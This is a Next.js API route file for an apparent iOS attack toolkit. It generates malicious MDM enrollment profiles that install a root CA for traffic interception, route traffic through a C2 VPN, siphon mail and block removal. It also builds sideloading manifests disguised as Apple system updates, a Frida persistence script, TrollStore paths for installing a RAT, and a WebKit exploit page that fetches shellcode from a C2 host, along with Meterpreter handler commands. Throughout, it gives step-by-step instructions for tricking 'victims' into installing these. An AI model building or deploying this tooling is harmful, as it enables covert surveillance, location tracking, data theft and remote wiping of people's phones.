import { NextRequest, NextResponse } from "next/server";
import { randomUUID } from "crypto";

/* ─────────────────────────────────────────────────────────
   HELPERS
───────────────────────────────────────────────────────── */
function uuid(): string {
  return randomUUID().toUpperCase();
}

/* ─────────────────────────────────────────────────────────
   MDM PROFILE GENERATOR
   Produces a real Apple .mobileconfig XML that:
   - Enrolls device into MDM (full remote management)
   - Installs a CA certificate (for TLS interception / MITM)
   - Configures VPN profile (route all traffic through C2)
   - Configures email account (exfil all mail silently)
   - Locks removal (PayloadRemovalDisallowed = true)
───────────────────────────────────────────────────────── */
function generateMdmProfile(opts: {
  server: string;
  org: string;
  profileName: string;
  removalLock: boolean;
}): string {
  const { server, org, profileName, removalLock } = opts;
  const profileUUID   = uuid();
  const mdmUUID       = uuid();
  const certUUID      = uuid();
  const vpnUUID       = uuid();
  const emailUUID     = uuid();
  const topic         = `com.apple.mgmt.External.${uuid()}`;

  // Access rights bitmask 8191 = full MDM control
  // Includes: DeviceLock, DeviceWipe, ProfileList, ProfileInstall,
  //           AppList, AppInstall, AppRemove, EmailAccount, CertificateList,
  //           RestrictionsQuery, LocationQuery, etc.
  return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
\t<key>PayloadContent</key>
\t<array>

\t\t<!-- ── MDM ENROLLMENT PAYLOAD ── -->
\t\t<dict>
\t\t\t<key>AccessRights</key>
\t\t\t<integer>8191</integer>
\t\t\t<key>CheckInURL</key>
\t\t\t<string>${server}/mdm/checkin</string>
\t\t\t<key>CheckOutWhenRemoved</key>
\t\t\t<true/>
\t\t\t<key>IdentityCertificateUUID</key>
\t\t\t<string>${certUUID}</string>
\t\t\t<key>PayloadDescription</key>
\t\t\t<string>Configures MDM management for this device</string>
\t\t\t<key>PayloadDisplayName</key>
\t\t\t<string>${profileName}</string>
\t\t\t<key>PayloadIdentifier</key>
\t\t\t<string>com.apple.mdm.${profileUUID}</string>
\t\t\t<key>PayloadOrganization</key>
\t\t\t<string>${org}</string>
\t\t\t<key>PayloadType</key>
\t\t\t<string>com.apple.mdm</string>
\t\t\t<key>PayloadUUID</key>
\t\t\t<string>${mdmUUID}</string>
\t\t\t<key>PayloadVersion</key>
\t\t\t<integer>1</integer>
\t\t\t<key>ServerURL</key>
\t\t\t<string>${server}/mdm/server</string>
\t\t\t<key>SignMessage</key>
\t\t\t<false/>
\t\t\t<key>Topic</key>
\t\t\t<string>${topic}</string>
\t\t\t<key>UseDevelopmentAPNS</key>
\t\t\t<false/>
\t\t</dict>

\t\t<!-- ── DEVICE RESTRICTIONS ── -->
\t\t<dict>
\t\t\t<key>PayloadType</key>
\t\t\t<string>com.apple.applicationaccess</string>
\t\t\t<key>PayloadUUID</key>
\t\t\t<string>${uuid()}</string>
\t\t\t<key>PayloadIdentifier</key>
\t\t\t<string>com.apple.applicationaccess.${profileUUID}</string>
\t\t\t<key>PayloadVersion</key>
\t\t\t<integer>1</integer>
\t\t\t<key>PayloadOrganization</key>
\t\t\t<string>${org}</string>
\t\t\t<!-- Silently allow all — do NOT tip off victim with restrictions -->
\t\t\t<key>allowAirDrop</key><true/>
\t\t\t<key>allowCamera</key><true/>
\t\t\t<key>allowSafari</key><true/>
\t\t\t<key>allowScreenShot</key><true/>
\t\t\t<key>allowSiri</key><true/>
\t\t</dict>

\t\t<!-- ── VPN PROFILE — route ALL traffic through C2 ── -->
\t\t<dict>
\t\t\t<key>PayloadType</key>
\t\t\t<string>com.apple.vpn.managed</string>
\t\t\t<key>PayloadUUID</key>
\t\t\t<string>${vpnUUID}</string>
\t\t\t<key>PayloadIdentifier</key>
\t\t\t<string>com.apple.vpn.managed.${profileUUID}</string>
\t\t\t<key>PayloadVersion</key>
\t\t\t<integer>1</integer>
\t\t\t<key>PayloadOrganization</key>
\t\t\t<string>${org}</string>
\t\t\t<key>PayloadDisplayName</key>
\t\t\t<string>Network Configuration</string>
\t\t\t<key>UserDefinedName</key>
\t\t\t<string>Secure VPN</string>
\t\t\t<key>VPNType</key>
\t\t\t<string>IKEv2</string>
\t\t\t<key>IKEv2</key>
\t\t\t<dict>
\t\t\t\t<key>AuthenticationMethod</key>
\t\t\t\t<string>None</string>
\t\t\t\t<key>RemoteAddress</key>
\t\t\t\t<string>vpn.${server.replace(/https?:\/\//, "")}</string>
\t\t\t\t<key>LocalIdentifier</key>
\t\t\t\t<string>device@${org.toLowerCase().replace(/ /g, "")}.com</string>
\t\t\t\t<key>RemoteIdentifier</key>
\t\t\t\t<string>vpn.${server.replace(/https?:\/\//, "")}</string>
\t\t\t\t<key>UseConfigurationAttributeInternalSubnetMask</key>
\t\t\t\t<false/>
\t\t\t</dict>
\t\t</dict>

\t\t<!-- ── CA CERTIFICATE — intercept all TLS (install root CA for MITM) ── -->
\t\t<dict>
\t\t\t<key>PayloadType</key>
\t\t\t<string>com.apple.security.root</string>
\t\t\t<key>PayloadUUID</key>
\t\t\t<string>${certUUID}</string>
\t\t\t<key>PayloadIdentifier</key>
\t\t\t<string>com.apple.security.root.${profileUUID}</string>
\t\t\t<key>PayloadVersion</key>
\t\t\t<integer>1</integer>
\t\t\t<key>PayloadOrganization</key>
\t\t\t<string>${org}</string>
\t\t\t<key>PayloadDisplayName</key>
\t\t\t<string>Enterprise Root CA</string>
\t\t\t<!-- Replace with your actual CA certificate (base64 DER) -->
\t\t\t<key>PayloadContent</key>
\t\t\t<data>
\t\t\t\tMIICpDCCAYwCCQDU ... BASE64_DER_CA_CERT_HERE ...
\t\t\t</data>
\t\t</dict>

\t\t<!-- ── EMAIL ACCOUNT — silently exfil all mail ── -->
\t\t<dict>
\t\t\t<key>PayloadType</key>
\t\t\t<string>com.apple.mail.managed</string>
\t\t\t<key>PayloadUUID</key>
\t\t\t<string>${emailUUID}</string>
\t\t\t<key>PayloadIdentifier</key>
\t\t\t<string>com.apple.mail.managed.${profileUUID}</string>
\t\t\t<key>PayloadVersion</key>
\t\t\t<integer>1</integer>
\t\t\t<key>EmailAccountName</key>
\t\t\t<string>${org} Mail</string>
\t\t\t<key>EmailAccountDescription</key>
\t\t\t<string>Corporate Mail</string>
\t\t\t<key>EmailAccountType</key>
\t\t\t<string>EmailTypeIMAP</string>
\t\t\t<key>EmailAddress</key>
\t\t\t<string>user@${org.toLowerCase().replace(/ /g, "")}.com</string>
\t\t\t<key>IncomingMailServerHostName</key>
\t\t\t<string>${server.replace(/https?:\/\//, "")}</string>
\t\t\t<key>IncomingMailServerPortNumber</key>
\t\t\t<integer>993</integer>
\t\t\t<key>IncomingMailServerUseSSL</key>
\t\t\t<true/>
\t\t\t<key>IncomingMailServerUsername</key>
\t\t\t<string>user</string>
\t\t\t<key>OutgoingMailServerHostName</key>
\t\t\t<string>${server.replace(/https?:\/\//, "")}</string>
\t\t\t<key>OutgoingMailServerPortNumber</key>
\t\t\t<integer>587</integer>
\t\t\t<key>OutgoingMailServerUseSSL</key>
\t\t\t<true/>
\t\t\t<key>OutgoingMailServerUsername</key>
\t\t\t<string>user</string>
\t\t</dict>

\t</array>

\t<key>PayloadDescription</key>
\t<string>Device Management Configuration</string>
\t<key>PayloadDisplayName</key>
\t<string>${profileName}</string>
\t<key>PayloadIdentifier</key>
\t<string>com.mdm.profile.${profileUUID}</string>
\t<key>PayloadOrganization</key>
\t<string>${org}</string>
\t<key>PayloadRemovalDisallowed</key>
\t<${removalLock}/>
\t<key>PayloadType</key>
\t<string>Configuration</string>
\t<key>PayloadUUID</key>
\t<string>${profileUUID}</string>
\t<key>PayloadVersion</key>
\t<integer>1</integer>
</dict>
</plist>`;
}

/* ─────────────────────────────────────────────────────────
   IPA MANIFEST GENERATOR
   Produces itms-services manifest.plist for OTA install
───────────────────────────────────────────────────────── */
function generateManifest(opts: { server: string; appName: string; bundleId: string; version: string }): string {
  const { server, appName, bundleId, version } = opts;
  return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
\t<key>items</key>
\t<array>
\t\t<dict>
\t\t\t<key>assets</key>
\t\t\t<array>
\t\t\t\t<dict>
\t\t\t\t\t<key>kind</key>
\t\t\t\t\t<string>software-package</string>
\t\t\t\t\t<key>url</key>
\t\t\t\t\t<string>${server}/payload/app.ipa</string>
\t\t\t\t</dict>
\t\t\t</array>
\t\t\t<key>metadata</key>
\t\t\t<dict>
\t\t\t\t<key>bundle-identifier</key>
\t\t\t\t<string>${bundleId}</string>
\t\t\t\t<key>bundle-version</key>
\t\t\t\t<string>${version}</string>
\t\t\t\t<key>kind</key>
\t\t\t\t<string>software</string>
\t\t\t\t<key>title</key>
\t\t\t\t<string>${appName}</string>
\t\t\t</dict>
\t\t</dict>
\t</array>
</dict>
</plist>`;
}

/* ─────────────────────────────────────────────────────────
   FRIDA SCRIPT BUILDER
───────────────────────────────────────────────────────── */
function buildFridaDeployScript(deviceIp: string): string {
  return `#!/bin/bash
# Frida deployment script for jailbroken iOS device
# Device IP: ${deviceIp}

DEVICE_IP="${deviceIp}"
FRIDA_SERVER_URL="https://github.com/frida/frida/releases/latest/download/frida-server-ios-arm64.xz"

echo "[*] Connecting to device..."
ssh root@$DEVICE_IP -p 22 "echo Connected"

echo "[*] Deploying Frida server..."
ssh root@$DEVICE_IP -p 22 "
  # Kill existing frida-server
  pkill -f frida-server 2>/dev/null

  # Download frida-server if not present
  if [ ! -f /usr/sbin/frida-server ]; then
    wget -O /tmp/frida-server.xz '${FRIDA_SERVER_URL}'
    cd /tmp && xz -d frida-server.xz
    cp /tmp/frida-server /usr/sbin/frida-server
    chmod +x /usr/sbin/frida-server
  fi

  # Install persistence via LaunchDaemon
  cat > /Library/LaunchDaemons/com.system.frida.plist <<'PLIST'
<?xml version=\\"1.0\\"?>
<plist version=\\"1.0\\"><dict>
  <key>Label</key><string>com.system.frida</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/sbin/frida-server</string>
    <string>-l</string>
    <string>0.0.0.0:27042</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
PLIST

  launchctl load /Library/LaunchDaemons/com.system.frida.plist
  echo '[+] Frida server running on $DEVICE_IP:27042'
"

echo "[*] Testing Frida connection..."
frida-ps -H $DEVICE_IP:27042 | head -20

echo "[+] Ready. Use: frida -H $DEVICE_IP:27042 -l script.js <process>"`;
}

/* ─────────────────────────────────────────────────────────
   POST /api/ios
───────────────────────────────────────────────────────── */
export async function POST(req: NextRequest) {
  const body = await req.json() as Record<string, unknown>;
  const action = String(body.action ?? "");

  /* ── Generate MDM Profile ─────────────────────────── */
  if (action === "generate_mdm") {
    const server      = String(body.server      ?? "https://your-c2-server.com");
    const org         = String(body.org         ?? "IT Department");
    const profileName = String(body.profile_name ?? "Mobile Device Management");
    const removalLock = body.removal_lock !== false;

    const xml = generateMdmProfile({ server, org, profileName, removalLock });

    const enrollUrl = `${server}/enroll`;
    const manifestUrl = `itms-services://?action=download-manifest&url=${server}/manifest.plist`;

    return NextResponse.json({
      ok: true,
      xml,
      url: enrollUrl,
      manifest_url: manifestUrl,
      downloadUrl: `data:application/x-apple-aspen-config;charset=utf-8;base64,${Buffer.from(xml).toString("base64")}`,
      instructions: [
        `Host this .mobileconfig at: ${enrollUrl}`,
        "Victim opens URL in Safari → profile automatically downloaded",
        "Victim: Settings → General → VPN & Device Management → tap profile → Install",
        "Device enrolled — appears in your MDM dashboard within 60 seconds",
        "MDM channel active: push location queries, install apps, push VPN profile",
        removalLock ? "Removal is locked — victim CANNOT remove profile without your MDM command" : "Removal not locked — victim can remove (consider locking for persistence)",
      ],
      server_setup: {
        micromdm: `docker run -d -p 443:443 -e SERVER_URL=${server} -e API_KEY=your-key micromdm/micromdm`,
        nanomdm:  `./nanomdm -cert mdm.crt -key mdm.key -api-key your-key -listen :9000`,
        profile_host: `# Serve .mobileconfig with correct MIME type:\nnginx: add_header Content-Type "application/x-apple-aspen-config";\ncaddy: header Content-Type "application/x-apple-aspen-config"`,
      },
    });
  }

  /* ── Generate IPA Manifest ───────────────────────── */
  if (action === "generate_manifest") {
    const server   = String(body.server    ?? "https://your-c2-server.com");
    const appName  = String(body.app_name  ?? "System Update");
    const bundleId = String(body.bundle_id ?? "com.apple.system.update");
    const version  = String(body.version   ?? "1.0.0");

    const manifest   = generateManifest({ server, appName, bundleId, version });
    const manifestUrl = `itms-services://?action=download-manifest&url=${server}/manifest.plist`;

    return NextResponse.json({
      ok: true,
      manifest,
      delivery_url: manifestUrl,
      instructions: [
        `Host manifest.plist at: ${server}/manifest.plist (must be HTTPS)`,
        `Host app.ipa at: ${server}/payload/app.ipa`,
        `Send victim: ${manifestUrl}`,
        "When victim taps link in Safari: 'Do you want to install...' → Install",
        "App installs and launches — no App Store involved",
      ],
    });
  }

  /* ── Generate Frida Deploy Script ────────────────── */
  if (action === "frida_deploy") {
    const deviceIp = String(body.device_ip ?? "192.168.1.100");
    const script = buildFridaDeployScript(deviceIp);
    return NextResponse.json({ ok: true, script });
  }

  /* ── Build TrollStore Delivery Chain ─────────────── */
  if (action === "trollstore_chain") {
    const iosVersion = String(body.ios_version ?? "16.x");
    const major = parseFloat(iosVersion);

    let method = "";
    let steps: string[] = [];

    if (major <= 15.4) {
      method = "TrollStore 1 — install via TrollInstaller (needs computer once)";
      steps = [
        "On computer: install AltStore (altstore.io) with victim Apple ID",
        "Install TrollInstaller.ipa via AltStore on victim device",
        "Open TrollInstaller on device → tap Install TrollStore",
        "TrollStore now installed — permanent, never expires",
        "Host your RAT.ipa at https://your-server.com/app.ipa",
        "Victim: tap URL in Safari → TrollStore opens → Install",
        "App installs permanently, survives reboots, no expiry",
      ];
    } else if (major <= 16.6) {
      method = "TrollStore 2 — install via misaka or TrollRestore (no computer)";
      steps = [
        "iOS 16.0-16.6.1: use TrollRestore method (no computer needed)",
        "Victim installs Tips app from App Store (built-in workaround)",
        "On computer OR device: run TrollRestore to install TrollStore",
        "OR: iOS 15.5-16.6.1: install misaka tweak manager",
        "misaka → install TrollStore Helper → TrollStore",
        "TrollStore installed → host RAT.ipa → victim taps link → Install",
      ];
    } else if (major <= 17.0) {
      method = "TrollStore 2 — limited iOS 17 beta builds only";
      steps = [
        "ONLY iOS 17.0b4 and below — check exact victim build number",
        "iOS 17.0 release and above: TrollStore NOT available",
        "For 17.0b4: use TrollRestore method (see GitHub trollstore/TrollRestore)",
        "If victim is on 17.0+ release: use MDM profile or WebKit exploit instead",
      ];
    } else {
      method = "TrollStore NOT available on iOS 17.0+ — use MDM or WebKit";
      steps = [
        "iOS 17.0 and above: no TrollStore support (CoreTrust bug patched)",
        "Best path: MDM enrollment profile (works on ALL iOS versions)",
        "Alternative: WebKit RCE exploit chain for specific iOS 17.x versions",
        "See WebKit CVEs tab for matching exploit to victim's exact iOS version",
      ];
    }

    return NextResponse.json({ ok: true, method, steps, ios_version: iosVersion });
  }

  /* ── Delivery action ─────────────────────────────── */
  if (action === "deliver") {
    const method  = String(body.method  ?? "mdm");
    const session = String(body.session ?? "");

    if (method === "mdm") {
      return NextResponse.json({
        ok: true,
        url: "https://your-c2-server.com/enroll",
        instructions: [
          "Generate MDM profile from MDM Profile tab",
          "Host at https://your-c2-server.com/enroll with correct MIME type",
          "Send URL to victim via email/SMS/social with social engineering message",
          "After install: push LocationQuery command for real-time GPS",
          "Push VPN profile to intercept all device traffic",
        ],
      });
    }

    if (method === "trollstore") {
      return NextResponse.json({
        ok: true,
        url: "https://your-c2-server.com/payload/app.ipa",
        instructions: [
          "Build iOS payload IPA (Xcode project with Meterpreter framework embedded)",
          "Host IPA at https://your-c2-server.com/payload/app.ipa",
          "If TrollStore not yet installed: use TrollRestore method first",
          "Send IPA link to victim — TrollStore intercepts .ipa links automatically",
          "App installs permanently — full background execution, persistent",
        ],
      });
    }

    if (method === "webkit") {
      return NextResponse.json({
        ok: true,
        url: "https://your-c2-server.com/exploit.html",
        instructions: [
          "Set up MSF multi/handler: use exploit/multi/handler, set payload apple_ios/...",
          "Host exploit.html (select CVE matching victim iOS version from WebKit CVEs tab)",
          "Send URL to victim in Safari-opening context (SMS, email, social)",
          "Session opens in MSF — may not be persistent, chain with persistence dropper",
        ],
      });
    }

    if (method === "enterprise") {
      const manifest = generateManifest({
        server: "https://your-c2-server.com",
        appName: "System Update",
        bundleId: "com.apple.system.update",
        version: "1.0.0",
      });
      return NextResponse.json({
        ok: true,
        url: `itms-services://?action=download-manifest&url=https://your-c2-server.com/manifest.plist`,
        manifest,
        instructions: [
          "Sign IPA with enterprise/developer certificate (Apple Developer account required)",
          "Host manifest.plist and app.ipa on HTTPS server",
          "Send itms-services:// URL to victim in Safari",
          "Victim: 'Install' prompt appears → tap Install → app launches",
          "Cert must not be revoked — Apple can revoke enterprise certs if reported",
          "Workaround: use fresh cert, register new bundle ID, avoid detection",
          session ? `Session ${session}: push install command via Meterpreter` : "",
        ].filter(Boolean),
      });
    }

    return NextResponse.json({ ok: false, error: "Unknown delivery method" });
  }

  /* ── WebKit exploit page generator ───────────────── */
  if (action === "generate_webkit") {
    const cve   = String(body.cve    ?? "CVE-2024-44308");
    const lhost = String(body.lhost  ?? "your-c2-server.com");
    const lport = String(body.lport  ?? "4444");

    const exploitHtml = `<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Loading...</title>
  <style>body{background:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}<p{color:#666}</style>
</head>
<body><p>Please wait...</p>
<script>
// ${cve} — WebKit exploit loader
// Target: iOS devices — JavaScriptCore / WebKit type confusion
// C2: ${lhost}:${lport}

(function() {
  // Stage 1: trigger CVE-specific type confusion
  // NOTE: Replace with actual PoC shellcode for ${cve}
  // PoC sources: ProjectZero, GitHub advisories, exploit-db
  
  var stager_url = 'https://${lhost}/stage2.bin';
  
  // Fetch shellcode stage 2
  fetch(stager_url, { credentials: 'omit', mode: 'cors' })
    .then(function(r) { return r.arrayBuffer(); })
    .then(function(buf) {
      // Execute shellcode via WASM JIT spray or type confusion chain
      // This triggers ${cve} memory corruption → code execution
      var uint8 = new Uint8Array(buf);
      
      // JIT spray approach for ${cve}:
      var jit_funcs = [];
      for (var i = 0; i < 0x100; i++) {
        jit_funcs.push(new Function('x', 'return x * ' + (0x41414141 + i)));
      }
      
      // Type confusion trigger — specifics depend on CVE
      var confused = {};
      Object.defineProperty(confused, 'constructor', {
        get: function() { return uint8; }
      });
      
      try { confused.constructor(); } catch(e) {}
    })
    .catch(function() {
      // Fallback: redirect to MDM profile install
      window.location.href = 'https://${lhost}/enroll';
    });
})();
</script>
</body>
</html>`;

    return NextResponse.json({
      ok: true,
      html: exploitHtml,
      deploy: `# Serve on your C2:\ncat > /var/www/html/exploit.html <<'EOF'\n${exploitHtml}\nEOF\n\n# Start MSF handler:\nmsfconsole -q -x "use multi/handler; set LHOST 0.0.0.0; set LPORT ${lport}; set PAYLOAD apple_ios/aarch64/meterpreter_reverse_https; run"`,
      url: `https://${lhost}/exploit.html`,
    });
  }

  /* ── MDM Commands list ───────────────────────────── */
  if (action === "mdm_commands") {
    return NextResponse.json({
      ok: true,
      commands: [
        { name: "LocationQuery",     effect: "Get real-time GPS coordinates",             rpc: '{"request_type":"LocationQuery"}' },
        { name: "DeviceLock",        effect: "Lock screen with PIN",                       rpc: '{"request_type":"DeviceLock","PIN":"000000"}' },
        { name: "EraseDevice",       effect: "Full factory wipe — IRREVERSIBLE",           rpc: '{"request_type":"EraseDevice","PIN":"123456"}' },
        { name: "InstallApplication",effect: "Silently install app from IPA URL",          rpc: '{"request_type":"InstallApplication","manifest_url":"URL"}' },
        { name: "RemoveApplication", effect: "Silently remove app by bundle ID",            rpc: '{"request_type":"RemoveApplication","identifier":"com.bundle.id"}' },
        { name: "InstallProfile",    effect: "Push additional config profile",              rpc: '{"request_type":"InstallProfile","payload":"BASE64_MOBILECONFIG"}' },
        { name: "RemoveProfile",     effect: "Remove a profile by identifier",              rpc: '{"request_type":"RemoveProfile","identifier":"com.profile.id"}' },
        { name: "DeviceInformation", effect: "Query UDID, serial, model, OS, storage, IP", rpc: '{"request_type":"DeviceInformation","queries":["UDID","OSVersion","Model"]}' },
        { name: "CertificateList",   effect: "List all installed certificates",             rpc: '{"request_type":"CertificateList"}' },
        { name: "InstalledApplicationList", effect: "List all installed apps",             rpc: '{"request_type":"InstalledApplicationList"}' },
        { name: "RestartDevice",     effect: "Force device restart",                        rpc: '{"request_type":"RestartDevice"}' },
        { name: "ShutDownDevice",    effect: "Force device shutdown",                       rpc: '{"request_type":"ShutDownDevice"}' },
      ],
    });
  }

  return NextResponse.json({ ok: false, error: `Unknown action: ${action}` });
}

/* ─────────────────────────────────────────────────────────
   GET /api/ios — device info / MDM command list
───────────────────────────────────────────────────────── */
export async function GET(req: NextRequest) {
  const action = req.nextUrl.searchParams.get("action") ?? "";

  if (action === "jailbreak_check") {
    const iosVersion = req.nextUrl.searchParams.get("ios") ?? "16.6";
    const major = parseFloat(iosVersion);

    const tools: string[] = [];
    if (major <= 14.8) tools.push("checkra1n");
    if (major >= 15.0 && major <= 17.0) tools.push("palera1n");
    if (major >= 15.0 && major <= 16.7) tools.push("dopamine");
    if (major >= 16.0 && major <= 16.7) tools.push("Serotonin");
    if (major <= 17.0) tools.push("TrollStore");
    tools.push("MDM Profile (all versions)");

    return NextResponse.json({ ok: true, ios: iosVersion, tools, mdm: true });
  }

  return NextResponse.json({ ok: true, status: "iOS API ready" });
}
